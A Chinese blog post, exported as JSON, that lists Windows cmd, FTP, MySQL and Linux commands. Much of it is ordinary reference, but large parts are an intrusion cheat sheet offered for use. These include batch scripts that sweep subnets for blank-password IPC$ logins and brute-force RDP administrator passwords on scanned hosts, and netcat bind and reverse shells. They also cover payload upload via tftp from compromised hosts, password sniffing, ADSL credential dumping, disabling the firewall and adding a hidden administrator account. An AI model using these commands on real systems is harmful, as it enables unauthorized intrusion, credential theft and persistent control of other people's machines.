[{"title":"cmd常用命令","date":"2017-05-20T16:55:42.000Z","path":"2017/05/21/cmd常用命令/","text":"最近不小心看到的资料以后可以尝试用cmd命令解决一些问题了。 一：net use \\ip\\ipc$ “ “ /user:” “ 建立IPC空链接net use \\ip\\ipc$ “密码” /user:”用户名” 建立IPC非空链接net use h: \\ip\\c$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:net use h: \\ip\\c$ 登陆后映射对方C：到本地为H:net use \\ip\\ipc$ /del 删除IPC链接net use h: /del 删除映射对方到本地的为H:的映射net user 用户名 密码 /add 建立用户net user guest /active:yes 激活guest用户net user 查看有哪些用户net user 帐户名 查看帐户的属性net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数net start 查看开启了哪些服务net start 服务名 开启服务；(如:net start telnet， net start schedule)net stop 服务名 停止某服务net time \\目标ip 查看对方时间net time \\目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息net view 查看本地局域网内开启了哪些共享net view \\ip 查看对方局域网内开启了哪些共享net config 显示系统网络设置net logoff 断开连接的共享net pause 服务名 暂停某服务net send ip “文本信息” 向对方发信息net ver 局域网内正在使用的网络连接类型和信息net share 查看本地开启的共享net share ipc$ 开启ipc$共享net share ipc$ /del 删除ipc$共享net share c$ /del 删除C：共享net user guest 12345 用guest用户登陆后用将密码改为12345net password 密码 更改系统登陆密码netstat -a 查看开启了哪些端口,常用netstat -annetstat -n 查看端口的网络连接情况，常用netstat -annetstat -v 查看正在进行的工作netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）netstat -s 查看正在使用的所有协议使用情况nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)del -F 文件名加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR .”表示删除当前目录下所有只读文件，“DEL/A-S .”表示删除当前目录下除系统文件以外的所有文件。 二：del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）move 盘符\\路径\\要移动的文件名 存放移动文件的路径\\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令at id号 开启已注册的某个计划任务at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止at id号 /delete 停止某个已注册的计划任务at 查看所有的计划任务at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机finger username @host 查看最近有哪些用户登陆telnet ip 端口 远和登陆服务器,默认端口为23open ip 连接到IP（属telnet登陆后的命令）telnet 在本机上直接键入telnet 将进入本机的telnetcopy 路径\\文件名1 路径\\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件copy c:\\srv.exe \\ip\\admin$ 复制本地c:\\srv.exe到对方的admin下cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件copy \\ip\\admin$\\svv.exe c:\\ 或:copy\\ip\\admin$*.* 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：xcopy 要复制的文件或目录树 目标地址\\目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:\\server.exe 登陆后，将“IP”的server.exe下载到目标主机c:\\server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送tftp -i 对方IP put c:\\server.exe 登陆后，上传本地c:\\server.exe至主机ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interfacearp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令mem 查看cpu使用情况attrib 文件名(目录名) 查看某文件（目录）的属性attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用＋则是添加为某属性dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间set 指定环境变量名称=要指派给变量的字符 设置环境变量set 显示当前所有的环境变量set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量pause 暂停批处理程序，并显示出：请按任意键继续….if 在批处理程序中执行条件处理（更多说明见if命令及变量）goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）call 路径\\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置echo 信息 在屏幕上显示出信息echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hellofind 文件名 查找某文件title 标题名字 更改CMD窗口标题名字color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白prompt 名称 更改cmd.exe的显示的命令提示符(把C:\\、D:\\统一改为：EntSky\\ ) 三：ver 在DOS窗口下显示版本信息winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFSmd 目录名 创建目录replace 源文件 要替换文件的目录 替换文件ren 原文件名 新文件名 重命名文件名tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称type 文件名 显示文本文件的内容more 文件名 逐屏显示输出文件doskey 要锁定的命令＝字符doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=taskmgr 调出任务管理器chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exepath 路径\\可执行文件的文件名 为可执行文件设置一个路径。cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；regedit /e 注册表文件名 导出注册表cacls 文件名 参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\\test.txt /D pub 设定d:\\test.txt拒绝pub用户访问。cacls 文件名 查看文件的访问用户权限列表REM 文本内容 在批处理文件中添加注解netsh 查看或更改本地网络配置情况 四：IIS服务命令：iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）iisreset /start或stop 启动（停止）所有Internet服务iisreset /restart 停止然后重新启动所有Internet服务iisreset /status 显示所有Internet服务状态iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。FTP 命令： (后面有详细说明内容)ftp的命令行格式为:ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。－d 使用调试方式。－n 限制ftp的自动登录,即不使用.netrc文件。－g 取消全局文件名。help [命令] 或 ？[命令] 查看命令说明bye 或 quit 终止主机FTP进程,并退出FTP管理方式.pwd 列出当前远端主机目录put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中mget [remote-files] 从远端主机接收一批文件至本地主机mput local-files 将本地主机中一批文件传送至远端主机dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件ascii 设定以ASCII方式传送文件(缺省值)bin 或 image 设定以二进制方式传送文件bell 每完成一次文件传送,报警提示cdup 返回上一级目录close 中断与远程服务器的ftp会话(与open对应)open host[port] 建立指定ftp服务器连接,可指定连接端口delete 删除远端主机中的文件mdelete [remote-files] 删除一批文件mkdir directory-name 在远端主机中建立目录rename [from] [to] 改变远端主机中的文件名rmdir directory-name 删除远端主机中的目录status 显示当前FTP的状态system 显示远端主机系统类型user user-name [password] [account] 重新以别的用户名登录远端主机open host [port] 重新建立一个新的连接prompt 交互提示模式macdef 定义宏命令lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录chmod 改变远端主机的文件权限case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母cd remote－dir 进入远程主机目录cdup 进入远程主机目录的父目录! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip 五：MYSQL 命令：mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。（例：mysql -h110.110.110.110 -Uroot -P123456注:u与root可以不用加空格，其它也一样）exit 退出MYSQLmysqladmin -u用户名 -p旧密码 password 新密码 修改密码grant select on 数据库. to 用户名@登录主机 identified by \\”密码\\”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。use mysql；show tables; 显示库中的数据表describe 表名; 显示数据表的结构create database 库名; 建库use 库名；create table 表名 (字段设定列表)； 建表drop database 库名;drop table 表名； 删库和删表delete from 表名; 将表中记录清空select from 表名; 显示表中的记录mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb 是一个文本文件，文件名任取，打开看看你会有新发现。win2003系统下新增命令（实用部份）：shutdown /参数 关闭或重启本地或远程主机。参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。例：shutdown /r /t 0 立即重启本地主机（无延时）taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。 六：Linux系统下基本命令： 要区分大小写uname 显示版本信息（同win2K的 ver）dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）pwd 查询当前所在的目录位置cd cd ..回到上一层目录，注意cd 与..之间有空格。cd /返回到根目录。cat 文件名 查看文件内容cat &gt;abc.txt 往abc.txt文件中写上内容。more 文件名 以一页一页的方式显示一个文本文件。cp 复制文件mv 移动文件rm 文件名 删除文件，rm -a 目录名删除目录及子目录mkdir 目录名 建立目录rmdir 删除子目录，目录内没有文档。chmod 设定档案或目录的存取权限grep 在档案中查找字符串diff 档案文件比较find 档案搜寻date 现在的日期、时间who 查询目前和你使用同一台机器的人以及Login时间地点w 查询目前上机者的详细资料whoami 查看自己的帐号名称groups 查看某人的Grouppasswd 更改密码history 查看自己下过的命令ps 显示进程状态kill 停止某进程gcc 黑客通常用它来编译C语言写的文件su 权限转换为指定使用者telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。ftp ftp连接上某服务器（同win2K）附：批处理命令与变量1：for命令及变量 基本格式：FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\ip\\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3(set):指定一个或一组文件，可使用通配符，如：(D:\\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开command_parameters：为特定命令指定参数或命令行开关IN (set)：指在(set)中取值；DO command ：指执行command参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\\pass.txt)时 }。用法举例：@echo offecho 用法格式：test.bat .. &gt; test.txtfor /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \\%1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。/L 指用增量形式（即从1-254或254-1）；输入的IP前面三位：..为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。@echo offecho 用法格式：ok.bat ipFOR /F %%i IN (D:\\user.dic) DO smb.exe %1 %%i D:\\pass.dic 200存为：ok.exe 说明：输入一个IP后，用字典文件d:\\pass.dic来暴解d:\\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。 七：2：if命令及变量 基本格式：IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。0 指发现并成功执行（真）；1 指没有发现、没执行（假）。IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。例：“if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. else echo test.txt.missing ”，注意命令中的“.” （二）系统外部命令(均需下载相关工具)：1、瑞士军刀：nc.exe参数说明： -h 查看帮助信息 -d 后台模式 -e prog程序重定向，一但连接就执行［危险］ -i secs延时的间隔 -l 监听模式，用于入站连接 -L 监听模式，连接天闭后仍然继续监听，直到CTR+C -n IP地址，不能用域名 -o film记录16进制的传输 -p[空格]端口 本地端口号 -r 随机本地及远程端口 -t 使用Telnet交互方式 -u UDP模式 -v 详细输出，用-vv将更详细 -w数字 timeout延时间隔 -z 将输入，输出关掉（用于扫锚时） 基本用法： nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口 nc -l -p 80 开启本机的TCP 80端口并监听 nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口 nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口 nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口 高级用法： nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止 nc -L -p 80 &gt; c:\\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt nc -L -p 80 &lt; c:\\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用 type.exe c:\\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用 本机上用：nc -l -p 本机端口 在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙 本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称 在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机 备 注： | 管道命令 &lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令 ＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\\winnt &gt;&gt; d:\\log.txt 意思是：后台执行dir，并把结果存在d:\\log.txt中 &gt;与&gt;&gt;的区别 “&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。如： @dir c:\\winnt &gt;&gt; d:\\log.txt和@dir c:\\winnt &gt; d:\\log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。 八：2、扫锚工具：xscan.exe基本格式xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息检测项目 -active 检测主机是否存活 -os 检测远程操作系统类型（通过NETBIOS和SNMP协议） -port 检测常用服务的端口状态 -ftp 检测FTP弱口令 -pub 检测FTP服务匿名用户写权限 -pop3 检测POP3-Server弱口令 -smtp 检测SMTP-Server漏洞 -sql 检测SQL-Server弱口令 -smb 检测NT-Server弱口令 -iis 检测IIS编码/解码漏洞 -cgi 检测CGI漏洞 -nasl 加载Nessus攻击脚本 -all 检测以上所有项目 其它选项 -i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过&quot;-l&quot;参数获取 -l 显示所有网络适配器 -v 显示详细扫描进度 -p 跳过没有响应的主机 -o 跳过没有检测到开放端口的主机 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10 -log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)用法示例xscan -host 192.168.1.1-192.168.255.255 -all -active -p 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机 九：3、命令行方式嗅探器: xsniff.exe可捕获局域网内FTP/SMTP/POP3/HTTP协议密码参数说明 -tcp 输出TCP数据报 -udp 输出UDP数据报 -icmp 输出ICMP数据报 -pass 过滤密码信息 -hide 后台运行 -host 解析主机名 -addr IP地址 过滤IP地址 -port 端口 过滤端口 -log 文件名 将输出保存到文件 -asc 以ASCII形式输出 -hex 以16进制形式输出 用法示例xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出 4、终端服务密码破解: tscrack.exe参数说明 -h 显示使用帮助 -v 显示版本信息 -s 在屏幕上打出解密能力 -b 密码错误时发出的声音 -t 同是发出多个连接（多线程） -N Prevent System Log entries on targeted server -U 卸载移除tscrack组件 -f 使用－f后面的密码 -F 间隔时间（频率） -l 使用－l后面的用户名 -w 使用－w后面的密码字典 -p 使用－p后面的密码 -D 登录主页面 用法示例tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户@if not exist ipcscan.txt goto noscan@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%inscan@echo 3389.txt no find or scan faild(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat@if not exist tscrack.exe goto noscan@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt:noscan@echo tscrack.exe no find or scan faild(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。 5、其它：Shutdown.exeShutdown \\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）fpipe -l 80 -s 1029 -r 80 www.sina.com.cn 当有人扫锚你的80端口时，他扫到的结果会完全是www.sina.com.cn的主机信息Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的 88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。OpenTelnet.exe (远程开启telnet工具)opentelnet.exe \\IP 帐号 密码 ntlm认证方式 Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\ip 连接上对方。NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。ResumeTelnet.exe (OpenTelnet附带的另一个工具)resumetelnet.exe \\IP 帐号 密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。 十：6、FTP命令详解：FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。FTP的命令行格式为：ftp -v -d -i -n -g [主机名] ，其中 -v 显示远程服务器的所有响应信息； -n 限制ftp的自动登录，即不使用；.n etrc文件； -d 使用调试方式； -g 取消全局文件名。 FTP使用的内部命令如下(中括号表示可选项):1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls.zip2.$ macro-ame[args]： 执行宏定义macro-name。3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。5.ascii：使用ascii类型传输方式。6.bell：每个命令执行完毕后计算机响铃一次。7.bin：使用二进制文件传输方式。8.bye：退出ftp会话过程。9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。10.cd remote-dir：进入远程主机目录。11.cdup：进入远程主机目录的父目录。12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。13.close：中断与远程服务器的ftp会话(与open对应)。14.cr：使用asscii方式传输文件时，将回车换行转换为回行。15.delete remote-file：删除远程主机文件。16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。18.disconnection：同close。19.form format：将文件传输方式设置为format，缺省为file方式。20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。22.hash：每传输1024字节，显示一个hash符号(#)。23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。25.image：设置二进制传输方式(同binary)。26.lcd[dir]：将本地工作目录切换至dir。27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。29.mdelete[remote-file]：删除远程主机文件。30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir .o.*.zipoutfile 。31.mget remote-files：传输多个远程文件。32.mkdir dir-name：在远程主机中建一目录。33.mls remote-file local-file：同nlist，但可指定多个文件名。34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。35.modtime file-name：显示远程主机文件的最后修改时间。36.mput local-file：将多个文件传输至远程主机。37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。该命令特别适用于远程主机为非UNIX机的情况。40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。41.open host[port]：建立指定ftp服务器连接，可指定连接端口。42.passive：进入被动传输方式。43.prompt：设置多个文件传输时的交互提示。44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。45.put local-file[remote-file]：将本地文件local-file传送至远程主机。46.pwd：显示远程主机的当前工作目录。47.quit：同bye，退出ftp会话。48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.49.recv remote-file[local-file]：同get。50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。51.rhelp[cmd-name]：请求获得远程主机的帮助。52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。53.rename[from][to]：更改远程主机文件名。54.reset：清除回答队列。55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。56.rmdir dir-name：删除远程主机目录。57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。58.send local-file[remote-file]：同put。59.sendport：设置PORT命令的使用。60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。61.size file-name：显示远程主机文件大小，如：site idle 7200。62.status：显示当前ftp状态。63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。64.sunique：将远程主机文件名存储设置为只一(与runique对应)。65.system：显示远程主机的操作系统类型。66.tenex：将文件传输类型设置为TENEX机的所需的类型。67.tick：设置传输时的字节计数器。68.trace：设置包跟踪。69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 371.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.73.?[cmd]：同help. 又看到了一些，补充 net share d:\\web=e:\\web /grant:zk0898,change 控制面版：运行&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;:control计算机管理：command MMC结束XP防火墙进程:net stop sharedaccess查看ADSL帐号密码的代码:dialupass /allusers /stext “c:\\pass.txt启动3389服务：net start TermService关闭所有防火墙的代码:cmd.exe /c net stop sharedaccessiis命令重启:iisreset /reboot用CMD命令实现路由跟踪:tracert 域名(如：www.google.com)结束进程：NET SHARE查看版本：ver查看中端(服务）：net start查看文件：dir查看3389：加用户：c:\\winnt\\system32&gt;net user adminserver$ admin /add提权限：net localgroup administrators adminserver$ /add211.38.172.2 2180查看用户net user远程连接到主机CMD命令：telnet 主机IP踢人：logoff ID查看当前人：query user打开telnet:net start 